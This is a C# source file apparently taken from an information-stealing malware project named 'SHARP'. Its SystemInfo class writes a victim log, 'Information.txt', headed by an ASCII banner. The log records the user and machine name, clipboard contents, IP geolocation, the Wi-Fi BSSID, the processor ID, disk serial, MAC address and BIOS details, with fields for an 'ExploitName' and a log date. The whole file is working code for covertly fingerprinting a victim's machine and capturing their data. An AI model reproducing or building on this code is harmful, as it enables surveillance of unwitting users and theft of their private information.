using Microsoft.Win32;
using System;
using System.Drawing;
using System.IO;
using System.Management;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace SHARP
{
    internal class SystemInfo
    {
      public static string username = Environment.UserName;
      public static string compname = Environment.MachineName;

      public static async Task GetSystem(string head)
      {
        File.WriteAllText(head + "\\Information.txt", $"\n---░██████╗██╗░░██╗░█████╗░██████╗░██████╗░---\n---██╔════╝██║░░██║██╔══██╗██╔══██╗██╔══██╗---\n---╚█████╗░███████║███████║██████╔╝██████╔╝---\n---░╚═══██╗██╔══██║██╔══██║██╔══██╗██╔═══╝░---\n---██████╔╝██║░░██║██║░░██║██║░░██║██║░░░░░---\n---╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░░░░---\n---------------ME----------------\n==============================================\n Operating system: {SystemInfo.GetSystemVersion()}\n PC user: {SystemInfo.compname}/{SystemInfo.username}\n ClipBoard: {Buffers.GetBuffer()}\n Launch: {Help.ExploitName}\n==============================================\n Screen resolution: {SystemInfo.ScreenMetrics()}\n Current time: {DateTime.Now.ToString()}\n HWID: {SystemInfo.GetProcessorID()}\n==============================================\n CPU: {SystemInfo.GetCPUName()}\n RAM: {SystemInfo.GetRAM()}\n GPU: {SystemInfo.GetGpuName()}\n==============================================\n IP Geolocation: {Help.IP} {Counting.country}\n Log Date: {Help.date}\n BSSID: {BSSID.GetBSSID()}\n==============================================\n HDD: {SystemInfo.GetHDDSerialNo()}\n MAC: {SystemInfo.GetMACAddress()}\n BIOS caption: {SystemInfo.GetBIOScaption()}\n==============================================");
      }

      public static string GetSystemVersion()
      {
        return $"{SystemInfo.GetWindowsVersionName()} {SystemInfo.GetBitVersion()}";
      }

      private static string GetMACAddress()
      {
        ManagementObjectCollection instances = new ManagementClass("Win32_NetworkAdapterConfiguration").GetInstances();
        string empty = string.Empty;
        foreach (ManagementObject managementObject in instances)
        {
          if (empty == string.Empty && (bool) managementObject["IPEnabled"])
            empty = managementObject["MacAddress"].ToString();
          managementObject.Dispose();
        }
        return empty;
      }

      public static string ScreenMetrics()
      {
        Rectangle bounds = Screen.GetBounds(Point.Empty);
        int width = bounds.Width;
        int height = bounds.Height;
        return $"{width.ToString()}x{height.ToString()}";
      }

      private static string GetBIOScaption()
      {
        foreach (ManagementObject managementObject in new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_BIOS").Get())
        {
          try
          {
            return managementObject.GetPropertyValue("Caption").ToString();
          }
          catch
          {
          }
        }
        return "BIOS Caption: Unknown";
      }

      public static string GetWindowsVersionName()
      {
        string windowsVersionName = "Unknown System";
        try
        {
          using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("root\\CIMV2", " SELECT * FROM win32_operatingsystem"))
          {
            foreach (ManagementBaseObject managementBaseObject in managementObjectSearcher.Get())
              windowsVersionName = Convert.ToString(managementBaseObject["Name"]);
            windowsVersionName = windowsVersionName.Split('|')[0];
            int length = windowsVersionName.Split(' ')[0].Length;
            windowsVersionName = windowsVersionName.Substring(length).TrimStart().TrimEnd();
          }
        }
        catch (Exception ex)
        {
          Console.WriteLine((object) ex);
        }
        return windowsVersionName;
      }

      private static string GetHDDSerialNo()
      {
        ManagementObjectCollection instances = new ManagementClass("Win32_LogicalDisk").GetInstances();
        string hddSerialNo = "";
        foreach (ManagementObject managementObject in instances)
          hddSerialNo += Convert.ToString(managementObject["VolumeSerialNumber"]);
        return hddSerialNo;
      }

      private static string GetBitVersion()
      {
        try
        {
          return Registry.LocalMachine.OpenSubKey("HARDWARE\\Description\\System\\CentralProcessor\\0").GetValue("Identifier").ToString().Contains("x86") ? "(32 Bit)" : "(64 Bit)";
        }
        catch (Exception ex)
        {
          Console.WriteLine((object) ex);
        }
        return "(Unknown)";
      }

      public static string GetCPUName()
      {
        try
        {
          string empty = string.Empty;
          foreach (ManagementBaseObject managementBaseObject in new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_Processor").Get())
            empty = managementBaseObject["Name"].ToString();
          return empty;
        }
        catch (Exception ex)
        {
          Console.WriteLine(ex?.ToString() + "СистемИнфа");
          return "Error";
        }
      }

      public static string GetRAM()
      {
        try
        {
          int num = 0;
          using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("Select * From Win32_ComputerSystem"))
          {
            using (ManagementObjectCollection.ManagementObjectEnumerator enumerator = managementObjectSearcher.Get().GetEnumerator())
            {
              if (enumerator.MoveNext())
                num = (int) (Convert.ToDouble(enumerator.Current["TotalPhysicalMemory"]) / 1048576.0) - 1;
            }
          }
          return num.ToString() + "MB";
        }
        catch (Exception ex)
        {
          Console.WriteLine((object) ex);
          return "Error";
        }
      }

      public static string GetProcessorID()
      {
        string empty = string.Empty;
        foreach (ManagementBaseObject managementBaseObject in new ManagementObjectSearcher("SELECT ProcessorId FROM Win32_Processor").Get())
          empty = (string) managementBaseObject["ProcessorId"];
        return empty;
      }

      public static string GetGpuName()
      {
        try
        {
          using (ManagementObjectCollection.ManagementObjectEnumerator enumerator = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_VideoController").Get().GetEnumerator())
          {
            if (enumerator.MoveNext())
              return enumerator.Current["Name"].ToString();
          }
        }
        catch (Exception ex)
        {
          Console.WriteLine((object) ex);
        }
        return "Unknown";
      }
    }
}
